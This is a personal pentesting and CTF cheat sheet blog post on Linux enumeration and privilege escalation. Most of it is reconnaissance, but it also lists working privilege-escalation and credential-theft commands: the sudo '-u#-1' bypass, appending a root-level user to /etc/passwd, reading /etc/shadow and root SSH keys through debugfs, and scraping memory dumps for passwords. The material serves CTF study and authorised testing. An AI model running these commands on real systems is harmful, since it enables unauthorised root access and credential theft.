@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preconnect" href="https://cdnjs.cloudflare.com"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title> Linux - Gesko</title><link rel="shortcut icon" href="/favicon.png"><link rel="alternate" type="application/atom+xml" title="Gesko" href="/atom.xml"><link rel="alternate" type="application/json" title="Gesko" href="/feed.json" /><link rel="sitemap" type="application/xml" title="sitemap" href="/sitemap.xml" /><style> *,:after,:before{box-sizing:border-box;background-color:inherit;color:inherit;margin:0;padding:0}html{font-size:17px}#theme-toggle{opacity:0.65;position:relative;border-radius:5px;height:25px;display:flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;transition:opacity 0.3s ease 0s;border:none;outline:none;background:none;cursor:pointer;padding:0px;appearance:none;transform:scale(0.8)}html,html[data-theme="light"]{--text-font: PT Sans;--source-code-font: Cousine;--very-light-text-color: rgb(222, 222, 222);--light-text-color: rgb(89, 183, 255);--medium-text-color: #555;--main-text-color: #333;--highlight-text-color: #6cb4a0;--dark-text-color: #393e46;--link-color: rgb(50, 87, 209);--code-bg-color: rgb(245, 245, 245);background-color:#fff}html #theme-toggle div,html[data-theme="light"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:none;background-color:var(--theme-ui-colors-transparent, transparent);transform:scale(1);transition:all 0.45s ease 0s;overflow:hidden;box-shadow:inset 8px -8px 0px 0px var(--theme-ui-colors-toggleIcon, #2d3748)}html #theme-toggle div::before,html[data-theme="light"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:none;border-radius:50%;transform:translate(0px, 0px);opacity:1;transition:transform 0.45s ease 0s}html #theme-toggle div::after,html[data-theme="light"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),0 23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),-23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748);transform:scale(0);transition:all 0.35s ease 0s}html[data-theme="dark"]{--text-font: PT Sans;--source-code-font: Cousine;--very-light-text-color: #EEE;--light-text-color: #c4bbf0;--medium-text-color: #52057b;--main-text-color: #EAEAEA;--highlight-text-color: #6cb4a0;--dark-text-color: rgb(36, 38, 42);--link-color: rgb(255, 89, 125);--code-bg-color: rgb(36, 38, 42);background-color:#131418}html[data-theme="dark"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:4px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);background-color:var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(0.55);transition:all 0.45s ease 0s;overflow:visible;box-shadow:none}html[data-theme="dark"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:2px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);border-radius:50%;transform:translate(14px, -14px);opacity:0;transition:transform 0.45s ease 0s}html[data-theme="dark"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),0 23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(1);transition:all 0.35s ease 0s}body{font-family:var(--text-font),"PT Sans",sans-serif;text-rendering:optimizeLegibility;line-height:1.75;color:var(--main-text-color)}a{color:var(--link-color);text-decoration:none}.post p{margin:1rem 0}.meta{margin:1.4rem 0}code,pre{background:var(--code-bg-color);margin:0 -27px;border-width:1px}code{font-family:var(--source-code-font),monospace;font-size:13px;margin:unset;padding:0.1rem;color:var(--highlight-text-color)}pre code{background-color:unset;color:unset;white-space:pre;overflow-x:scroll;overflow-y:hidden;display:block}pre{border-width:3px;padding:0.8rem;white-space:pre-wrap;border-style:none none none solid;border-color:var(--light-text-color)}img{max-width:100%}hr{background:var(--light-text-color);height:1px;border:0}header{flex-basis:10rem;flex-grow:1;position:relative}header a{text-decoration:none}header li{margin-bottom:0.2rem;text-align:right;margin-right:2rem}header a.active{font-weight:bold}header,section{padding:1rem 0}section{margin-top:5.5rem}blockquote{font-style:italic;border-left:5px solid var(--dark-text-color);padding-left:1rem}h1{color:var(--main-text-color);text-transform:uppercase;font-size:2rem;font-weight:bold;margin-bottom:1.0rem;margin-top:1.0rem}h2,h3,h4,h5{font-weight:bold;margin-bottom:1.5rem;font-size:2rem}h2{font-size:1.8rem;margin-top:1.0rem;margin-bottom:1.0rem}h3{font-size:1.6rem}h4{font-size:1.4rem}h5{font-size:1.2rem}h6{font-size:1rem}section h1:first-child{margin-top:0}strong,b{font-weight:bold}.photos ul{list-style:none}.photos li{margin-bottom:1.5rem}.photo picture,.project picture{margin-bottom:0.5rem}.posts>h3{font-weight:500}.post ul{margin:0px;margin:0px 0px 10px 10px}.post ol{margin:0px;margin:0px 0px 10px 15px}.posts li{align-items:center;display:flex;justify-content:space-between;margin-bottom:0.5rem}.posts li a,.posts li div,.projects li a{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:bold}.posts li time,.projects li time{padding-left:1rem;white-space:nowrap;font-variant-numeric:tabular-nums}time{color:var(--main-text-color)}.post>h1.title{font-size:x-large;margin-top:0;margin-bottom:0}.post>time{margin-bottom:0;margin-top:3rem}.highlight{margin:0px}main{display:flex;max-width:47rem;margin:-5rem auto 0;padding:2.4rem 2rem;flex-direction:column}.flex-row-between{display:flex;flex-direction:row;justify-content:space-between}.social-footer{padding:1rem;display:flex;justify-content:center;position:initial}.social-footer .social-footer-icons .fa{font-size:1.3rem;color:#a9a9a9}.social-footer .social-footer-icons .fa:hover{color:dimgray;transition:color 0.3s ease-in}@media screen and (max-width: 45rem){header li{display:inline;margin-right:1rem}.logo{padding-bottom:1rem}header ul{border-bottom:1px solid #edf2f7;padding-bottom:2rem}nav ul{border-right:0px}.photos ul{margin-top:0.5rem}main{padding:0 2rem}}section{flex-grow:999;display:flex;flex-direction:column}figcaption{font-size:smaller}.bio{margin-bottom:5rem}::selection{background-color:#fffba0;color:#333}.search-article{position:relative}.search-article label[for="search-input"]{position:relative;top:-10px;left:11px}.search-article input[type="search"]{top:-1rem;left:0;border:0;width:100%;height:30px;outline:none;position:absolute;border-radius:5px;padding:10px 10px 10px 35px;color:var(--main-text-color);-webkit-appearance:none;background-color:rgba(128,128,128,0.1);border:1px solid rgba(128,128,128,0.1)}.search-article input[type="search"]::-webkit-input-placeholder{color:#808080}.search-article input[type="search"]::-webkit-search-decoration,.search-article input[type="search"]::-webkit-search-results-decoration{display:none}#search-results{text-align:center}#search-results li{text-align:center}#search-results li::before{content:"›";display:inline-block;margin-left:-1.3em;width:1.3em;color:var(--main-text-color)}.post-nav{display:flex;position:relative;margin-top:0;border-top:2px solid var(--light-text-color);line-height:1.4}.post-nav .post-nav-item{border-bottom:0;padding-bottom:10px;width:50%;padding-top:10px;text-decoration:none;box-sizing:border-box}.post-nav .post-nav-item .post-title{color:var(--main-text-color)}.post-nav .post-nav-item:hover .post-title,.post-nav .post-nav-item:focus .post-title{color:var(--link-color);opacity:0.9}.post-nav .post-nav-item .nav-arrow{font-size:17px;color:var(--main-text-color);margin-bottom:3px;font-weight:bold}.post-nav .post-nav-item:nth-child(odd){padding-left:0;padding-right:20px}.post-nav .post-nav-item:nth-child(even){text-align:right;padding-right:0;padding-left:20px}.tags ul{list-style:none;display:grid;grid-template-columns:auto auto auto auto auto auto;grid-template-rows:auto auto auto auto}.tags li{white-space:normal;text-overflow:ellipsis}.timeline{position:center;width:650px;margin:-6em auto;padding:1px;list-style-type:none}@media (max-width: 860px){.timeline{width:100%}}.timeline:before{position:absolute;left:50%;top:0;content:' ';display:block;width:6px;height:100%;margin-left:-3px;background:var(--light-text-color);z-index:5}@media (max-width: 375px){.timeline:before{height:150%}}.timeline li{padding:2em 0}@media (max-width: 860px){.timeline li{padding:2em 0}}.timeline li::after{content:"";display:block;clear:both;visibility:hidden}.direction-l{position:relative;width:287px;float:left;text-align:right}@media (max-width: 860px){.direction-l{float:none;width:100%;text-align:center}}.direction-l .flag{color:#333;box-shadow:-1px 1px 1px rgba(0,0,0,0.52)}.direction-l .flag:after{content:"";position:absolute;left:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-left-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-l .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-l .time-wrapper{float:left}@media (max-width: 860px){.direction-l .time-wrapper{float:none}}.direction-r{position:relative;width:293px;float:right;text-align:left}@media (max-width: 860px){.direction-r{float:none;width:100%;text-align:center}}.direction-r .flag{color:#333;box-shadow:1px 1px 1px rgba(0,0,0,0.52)}.direction-r .flag:after{content:"";position:absolute;right:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-right-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-r .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-r .flag:before{left:-40px}.direction-r .time-wrapper{float:right}@media (max-width: 860px){.direction-r .time-wrapper{float:none}}.flag-wrapper{position:relative;display:inline-block;text-align:center}@media (max-width: 860px){.flag-wrapper{text-align:center}}.flag-wrapper .flag{position:relative;display:inline;background:#f8f8f8;padding:6px 10px;border-radius:5px;font-weight:600;text-align:left}@media (max-width: 860px){.flag-wrapper .flag{background:#fff;z-index:15}}.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:60%;right:-40px;content:' ';display:block;width:12px;height:12px;margin-top:-10px;background:#fff;border-radius:10px;border:4px solid var(--link-color);z-index:10}@media (max-width: 860px){.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:-30px;left:53%;content:' ';display:block;margin-left:-10px}}.time-wrapper{display:inline;line-height:1em;font-size:0.66666em;color:var(--link-color);vertical-align:middle}@media (max-width: 860px){.time-wrapper{display:block;position:relative;margin:4px 0 0 0;z-index:14}}.time-wrapper .time{display:inline-block;padding:4px 6px;background:#f8f8f8}.desc{margin:1em 0.2em -3.5em 0;font-size:0.9em;line-height:1.5em}.desc a{color:var(--link-color);text-decoration:none}.desc a:hover{text-decoration:underline}@media (max-width: 860px){.desc{position:relative;margin:1em 1em 0 1em;padding:1em;background:var(--code-bg-color);box-shadow:0 0 1px rgba(0,0,0,0.2);z-index:15}}</style></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-3EP7KLCYVP"></script> <script> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-3EP7KLCYVP'); </script><body><main><section class="post"><div class="flex-row-between"> <a href="/">« back</a> <button title="Change theme" id="theme-toggle" onclick="modeSwitcher()"><div></div></button></div><time datetime="2021-12-16T00:00:00+01:00">Dec 16, 2021 - 1 ' read</time><h1 class="title"> Linux</h1><span class="meta"> <a href="/tag/web">web</a>, <a href="/tag/crypto">crypto</a>, <a href="/tag/enum">enum</a></span><p>#tech/cybersecurity/pentest #tech/linux #tech/cybersecurity/enum</p><h1 id="quick-start"> Quick start <a href="#quick-start">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># For starters in CTF, try locating both user.txt and root.txt quickly and see if it will return any results</span>
+locate user.txt
+locate root.txt
+find / <span class="nt">-name</span> user.txt 2&gt; /dev/null
+find / <span class="nt">-name</span> root.txt 2&gt; /dev/null
+</code></pre></div></div><h1 id="remote-recon"> Remote recon <a href="#remote-recon">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># finding unix users (only if SMB is active)</span>
+enum4linux <span class="nt">-a</span> 10.10.230.193
+</code></pre></div></div><h1 id="system-information"> System Information <a href="#system-information">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check what OS and kernel</span>
+<span class="nb">cat</span> /etc/os-release
+<span class="nb">cat</span> /etc/centos-release
+lsb_release <span class="nt">-a</span>
+<span class="nb">uname</span> <span class="nt">-a</span>
+
+<span class="c"># dmesg verification failed?</span>
+dmesg 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">"signature"</span>
+
+<span class="c"># other system enumeration</span>
+<span class="nb">date</span>
+<span class="o">(</span><span class="nb">df</span> <span class="nt">-h</span> <span class="o">||</span> lsblk<span class="o">)</span>
+lscpu <span class="o">&amp;&amp;</span> free <span class="nt">-m</span>
+lpstat <span class="nt">-a</span> 2&gt;/dev/null
+</code></pre></div></div><h1 id="sudo"> SUDO <a href="#sudo">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># check is sudo is vulnerable</span>
+<span class="nb">sudo</span> <span class="nt">-V</span> | <span class="nb">grep</span> <span class="s2">"Sudo ver"</span> | <span class="nb">grep</span> <span class="s2">"1</span><span class="se">\.</span><span class="s2">[01234567]</span><span class="se">\.</span><span class="s2">[0-9]</span><span class="se">\+\|</span><span class="s2">1</span><span class="se">\.</span><span class="s2">8</span><span class="se">\.</span><span class="s2">1[0-9]</span><span class="se">\*\|</span><span class="s2">1</span><span class="se">\.</span><span class="s2">8</span><span class="se">\.</span><span class="s2">2[01234567]"</span>
+<span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+searchsploit <span class="nb">sudo</span>
+
+<span class="c"># others</span>
+<span class="nb">sudo</span> <span class="nt">-i</span>
+<span class="nb">sudo</span> /bin/bash
+<span class="nb">sudo </span>su-
+pkexec visudo
+
+<span class="c"># Check sudoers</span>
+<span class="nb">cat</span> /etc/sudoers
+<span class="nb">ls</span> <span class="nt">-l</span> /etc/sudoers.d
+<span class="nb">cat</span> /etc/sudoers.d/README
+<span class="nb">cat</span> /etc/sudoers.d/alice
+
+<span class="c"># Check if the files are writable</span>
+<span class="nb">echo </span>newroot:x:0:0:root:/root:/bin/bash <span class="o">&gt;&gt;</span> /etc/passwd
+<span class="nb">ls</span> <span class="nt">-l</span> /etc/shadow /etc/sudoers
+
+<span class="c"># check if an account has recently used sudo</span>
+<span class="nb">ls</span> <span class="nt">-l</span> /home/server-management/.sudo_as_admin_successful
+</code></pre></div></div><h1 id="users-and-credentials"> Users and Credentials <a href="#users-and-credentials">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># find ssh keys</span>
+find / <span class="nt">-name</span> authorized_keys 2&gt; /dev/null
+find / <span class="nt">-iname</span> <span class="s1">'*id_rsa*'</span> 2&gt; /dev/null
+
+<span class="c"># get in-memory passwords</span>
+strings /dev/mem <span class="nt">-n10</span> | <span class="nb">grep</span> <span class="nt">-i</span> PASS
+
+<span class="c"># see if authenticator is running then dump it</span>
+ps <span class="nt">-ef</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep</span> <span class="s2">"authenticator"</span>
+./dump-memory.sh 2027
+strings <span class="k">*</span>.dump | <span class="nb">grep</span> <span class="nt">-i</span> password
+
+<span class="c"># check current paths</span>
+<span class="nb">echo</span> <span class="nv">$PATH</span>
+
+<span class="c"># See if you can access another user's home directory</span>
+<span class="nb">ls</span> <span class="nt">-lRta</span> /home
+find /home/smeagol <span class="nt">-type</span> f
+<span class="nb">cd</span> /home/anotheruser
+<span class="nb">ls</span> <span class="nt">-lrta</span>
+<span class="nb">cat</span> .bash_history
+<span class="nb">ls</span> <span class="nt">-lrta</span> .ssh
+<span class="nb">ls</span> <span class="nt">-lRta</span> /home/anotheruser
+
+<span class="c"># Check history files</span>
+<span class="nb">cd</span> ~
+<span class="nb">history</span> | <span class="nb">grep</span> <span class="nt">-i</span> pass
+<span class="nb">history
+cat</span> ~/.zsh_history
+<span class="nb">cat</span> ~/.python_history
+
+<span class="c"># search for user passwords</span>
+<span class="nb">grep</span> <span class="nt">-ir</span> pass ~/
+
+<span class="c"># Check last logins</span>
+last | <span class="nb">head</span>
+
+<span class="c"># Check user permissions</span>
+<span class="nb">id
+</span>find / <span class="nt">-user</span> smeagol 2&gt; /dev/null | egrep <span class="nt">-v</span> <span class="s1">'^/(proc|dev|sys|run)'</span>
+find / <span class="nt">-group</span> smeagol 2&gt; /dev/null | egrep <span class="nt">-v</span> <span class="s1">'^/(proc|dev|sys|run)'</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+
+<span class="c"># Check user shell environment</span>
+<span class="nb">env</span>
+
+<span class="c"># Check ability to switch to another account</span>
+<span class="nb">cat</span> /etc/passwd
+<span class="nb">cat</span> /etc/passwd | egrep <span class="nt">-v</span> <span class="s1">'nologin|false'</span>
+<span class="nb">cat</span> /etc/group
+su &lt;user&gt;
+su - &lt;user&gt;
+<span class="nb">cat</span> .basrc
+<span class="nb">cat</span> .bash_profile
+<span class="nb">cat</span> .bash_logout
+<span class="nb">cat</span> .bash_history
+
+<span class="c"># Check shadow file for wrong permissions</span>
+<span class="nb">cat</span> /etc/shadow
+
+<span class="c"># check any weird profiles</span>
+<span class="nb">ls</span> <span class="nt">-l</span> /etc/profile /etc/profile.d/
+
+<span class="c"># check old credentials</span>
+<span class="nb">cat</span> /etc/security/opasswd
+</code></pre></div></div><ul><li>[[Password Reuse]]</li><li><code class="language-plaintext highlighter-rouge">cat /etc/shadow</code> then try [[Password Cracking]]</li></ul><h1 id="suid-and-guid"> SUID and GUID <a href="#suid-and-guid">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Once you find a list of commands, be sure to check</span>
+<span class="c"># if privesc is possible. You can go to</span>
+<span class="c"># https://gtfobins.github.io. Example command I found</span>
+<span class="c"># is /usr/local/bin/nmap</span>
+find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt; /dev/null
+find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+find / <span class="nt">-type</span> f <span class="nt">-a</span> <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-u</span>+s <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-u</span>+s <span class="se">\)</span> 2&gt; /dev/null
+
+<span class="c"># Check what shared objects and modules are being</span>
+<span class="c"># referenced by juicy binaries. If there is a</span>
+<span class="c"># reference object that you can create, you can</span>
+<span class="c"># compile it and put it on the location. See more on</span>
+<span class="c"># this site:</span>
+<span class="c">#   [Pentest-Cheatsheets/linux-examples.rst at master · Tib3rius/Pentest-Cheatsheets · GitHub](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst)</span>
+strace /usr/sbin/checker
+</code></pre></div></div><h1 id="capabilities"> Capabilities <a href="#capabilities">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># get all binaries with caps</span>
+getcap <span class="nt">-r</span> / 2&gt; /dev/null
+
+<span class="c"># check user capability</span>
+capsh <span class="nt">--print</span>
+</code></pre></div></div><h1 id="scheduled-tasks"> Scheduled tasks <a href="#scheduled-tasks">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Look for user cron</span>
+crontab <span class="nt">-l</span>
+
+<span class="c"># Look for system cron</span>
+<span class="c">#   TIP: commands here are normally run by root</span>
+<span class="nb">cat</span> /etc/crontab
+
+<span class="c"># check hidden crons</span>
+<span class="nb">ls</span> <span class="nt">-lRta</span> /etc/cron.d /etc/cron.<span class="o">{</span>daily,hourly,weekly,monthly<span class="o">}</span>
+
+<span class="c"># see if you can see something from spool</span>
+<span class="nb">ls</span> <span class="nt">-lRta</span> /var/spool/cron/
+
+<span class="c"># check if you can plant a program inside</span>
+<span class="c"># /etc/cron.hourly</span>
+<span class="nb">touch</span> /etc/cron.hourly/sample
+
+<span class="c"># you can use pspy also</span>
+<span class="nb">chmod</span> +x pspy64 <span class="o">&amp;&amp;</span> ./pspy64 <span class="nt">-pf</span> <span class="nt">-i</span> 1000
+</code></pre></div></div><ul><li>Check unusual file activities. For examlple, in THM convert my video box, i cannot see any useful cron configuration but i see that <code class="language-plaintext highlighter-rouge">downloads</code> directory keeps on disappearing. It turned out that there is a script <code class="language-plaintext highlighter-rouge">clean.sh</code> being run by cron.</li><li>Some crons may be hidden under root user’s cron which is <code class="language-plaintext highlighter-rouge">/var/spool/cron/root</code></li></ul><h1 id="processes-and-services"> Processes and Services <a href="#processes-and-services">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check what are running processes. Check also if</span>
+<span class="c"># there are processes that keeps on appearing and</span>
+<span class="c"># disappearing.</span>
+ps <span class="nt">-ef</span>
+
+<span class="c"># Check what processes are being run by root</span>
+ps <span class="nt">-fu</span> root
+
+<span class="c"># Check what processes are run by other users</span>
+<span class="nb">ls</span> <span class="nt">-lrta</span> /home
+ps <span class="nt">-fu</span> kel
+
+<span class="c"># try checking processes count repeatedly</span>
+ps <span class="nt">-ef</span> | <span class="nb">wc</span> <span class="nt">-l</span>
+
+<span class="c"># check timers</span>
+systemctl list-timers <span class="nt">--all</span>
+
+<span class="c"># use pspy</span>
+./pspy
+</code></pre></div></div><p><strong>some questions</strong></p><ul><li>Is any unknown software running?</li><li>Is any software with more privileges that it should have running?</li><li>Search for exploits for running processes (specially if running of versions)</li><li>Can you modify the binary of any running process?</li><li>Monitor processes and check if any interesting process is running frequently</li><li>Can you read some interesting process memory (where passwords could be saved)?</li></ul><p><strong>tools</strong></p><ul><li><a href="https://github.com/DominicBreuker/pspy">pspy</a></li></ul><h1 id="files-and-directories"> Files and directories <a href="#files-and-directories">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># What files where modified recently?</span>
+find /home <span class="nt">-type</span> f <span class="nt">-mmin</span> <span class="nt">-60</span>
+find / <span class="nt">-mmin</span> <span class="nt">-10</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s2">"^/(dev|run|proc|sys)"</span>
+find / <span class="nt">-mmin</span> <span class="nt">-10</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s2">"^/(dev|run|proc|sys|var)"</span>
+
+<span class="c"># Try to find some txt files</span>
+find / <span class="nt">-name</span> <span class="k">*</span>.txt 2&gt; /dev/null
+
+<span class="c"># Check root filesystem layout</span>
+<span class="nb">ls</span> <span class="nt">-lrta</span> /
+
+<span class="c"># Check what apps are installed</span>
+<span class="nb">ls</span> <span class="nt">-lrta</span> /opt /usr/local /srv /usr/share
+<span class="nb">ls</span> <span class="nt">-lRta</span> /opt /usr/local /srv /usr/share
+
+<span class="c"># Check juicy files in /tmp</span>
+<span class="nb">ls</span> <span class="nt">-lrta</span> /tmp
+<span class="nb">ls</span> <span class="nt">-lRta</span> /tmp
+
+<span class="c"># Check configurations</span>
+<span class="nb">ls</span> <span class="nt">-lrta</span> /etc
+<span class="nb">ls</span> <span class="nt">-lRta</span> /etc
+
+<span class="c"># What are all the files can I write to?</span>
+find / <span class="nt">-writable</span> <span class="nt">-ls</span> 2&gt; /dev/null | egrep <span class="nt">-v</span> <span class="s1">'/(proc|dev)'</span>
+find / <span class="nt">-type</span> f <span class="nt">-writable</span> <span class="nt">-path</span> /sys <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-path</span> /usr <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-path</span> /lib <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> d 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'/(opt|sys)'</span>
+
+<span class="c"># What files can you read?</span>
+find /home <span class="nt">-readable</span>
+
+<span class="c"># What folder can I write to?</span>
+find / <span class="nt">-regextype</span> posix-extended <span class="nt">-regex</span> <span class="s2">"/(sys|srv|proc|usr|lib|var)"</span> <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> d <span class="nt">-writable</span> 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'/(opt|sys)'</span>
+
+<span class="c"># Check what files are owned by root (you may have</span>
+<span class="c"># chance to edit them)</span>
+find /var/www/html <span class="nt">-user</span> root <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ld</span> <span class="o">{}</span> <span class="se">\;</span>
+
+<span class="c"># find files not owned by any user or group</span>
+find / <span class="nt">-nouser</span> <span class="nt">-print</span> 2&gt;/dev/null
+find / <span class="nt">-nogroup</span> <span class="nt">-print</span> 2&gt;/dev/null
+
+<span class="c"># see if you can write to /etc</span>
+<span class="nb">touch</span> /etc/sample
+
+<span class="c"># check for backups</span>
+<span class="nb">ls</span> <span class="nt">-lrta</span> /var/backups
+<span class="nb">ls</span> <span class="nt">-l</span> /var/backups | <span class="nb">grep</span> <span class="nt">-i</span> shadow
+</code></pre></div></div><h1 id="installed-softwares-and-apps"> Installed Softwares and Apps <a href="#installed-softwares-and-apps">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># check useful binaries</span>
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb <span class="nb">base64 </span>socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas <span class="nb">sudo </span>fetch docker lxc ctr runc rkt kubectl 2&gt;/dev/null
+
+<span class="c"># check any compiler</span>
+<span class="o">(</span>dpkg <span class="nt">--list</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">"compiler"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"decompiler</span><span class="se">\|</span><span class="s2">lib"</span> 2&gt;/dev/null <span class="o">||</span> yum list installed <span class="s1">'gcc*'</span> 2&gt;/dev/null | <span class="nb">grep </span>gcc 2&gt;/dev/null<span class="p">;</span> which gcc g++ 2&gt;/dev/null <span class="o">||</span> locate <span class="nt">-r</span> <span class="s2">"/gcc[0-9</span><span class="se">\.</span><span class="s2">-]</span><span class="se">\+</span><span class="s2">$"</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/doc/"</span><span class="o">)</span>
+
+<span class="c"># check vulnerable softwares installed</span>
+dpkg <span class="nt">-l</span>
+dpkg <span class="nt">-l</span> | <span class="nb">grep</span> <span class="nt">-i</span> apache
+rpm <span class="nt">-qa</span>
+searchsploit php 7.
+</code></pre></div></div><h1 id="filesystem"> Filesystem <a href="#filesystem">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check mounts</span>
+<span class="nb">df</span> <span class="nt">-h</span>
+
+<span class="c"># Is the user a member of the Disk group and can we read the contents of the file system?</span>
+debugfs /dev/xvda1
+debugfs: <span class="nb">cat</span> /root/.ssh/id_rsa
+debugfs: <span class="nb">cat</span> /etc/shadow
+
+<span class="c"># check fstab - any credentials? :)</span>
+<span class="nb">cat</span> /etc/fstab
+
+<span class="c"># check other mounts</span>
+<span class="nb">ls</span> <span class="nt">-lRta</span> /media
+</code></pre></div></div><h1 id="network"> Network <a href="#network">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check for other listening ports. There might be</span>
+<span class="c"># ports that are not capture by nmap. You may be able</span>
+<span class="c"># to pivot using SSH tunnel.</span>
+ss <span class="nt">-tulnap</span>
+ss <span class="nt">-tulnap</span> | <span class="nb">grep </span>LISTEN
+<span class="nb">cat</span> /proc/net/tcp
+
+<span class="c"># Check available interfaces. You might docker bridge.</span>
+<span class="o">(</span>ifconfig <span class="o">||</span> ip a<span class="o">)</span>
+<span class="nb">cat</span> /proc/net/arp
+<span class="nb">cat</span> /proc/net/fib_trie
+
+<span class="c"># Check common config files</span>
+<span class="nb">cat</span> /etc/hosts<span class="p">;</span> <span class="nb">echo</span> <span class="o">======</span><span class="p">;</span> <span class="nb">cat</span> /etc/resolv.conf
+
+<span class="c"># Is root login via SSH allowed? check any further</span>
+<span class="c"># ssh configurations</span>
+<span class="nb">cat</span> /etc/ssh/sshd_config | egrep <span class="nt">-v</span> <span class="s1">'^($|#)'</span>
+<span class="nb">cat</span> /etc/ssh/sshd_config | <span class="nb">grep </span>PermitRootLogin
+</code></pre></div></div><h1 id="automated-enumeration"> Automated enumeration <a href="#automated-enumeration">#</a></h1><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lse</span>
+bash lse.sh <span class="nt">-l</span> 2
